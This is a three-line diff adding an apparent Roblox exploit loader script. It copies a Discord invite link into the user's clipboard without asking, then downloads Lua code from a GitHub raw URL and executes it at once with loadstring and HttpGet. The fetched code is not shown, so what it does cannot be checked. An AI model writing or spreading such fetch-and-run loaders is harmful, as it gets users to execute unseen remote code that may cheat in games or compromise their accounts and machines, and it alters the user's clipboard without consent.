@@ -1,0 +1,3 @@
+setclipboard("https://discord.com/invite/zx6mv4q92P")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/17ff87a1179336ef2cd7d883.lua'))()
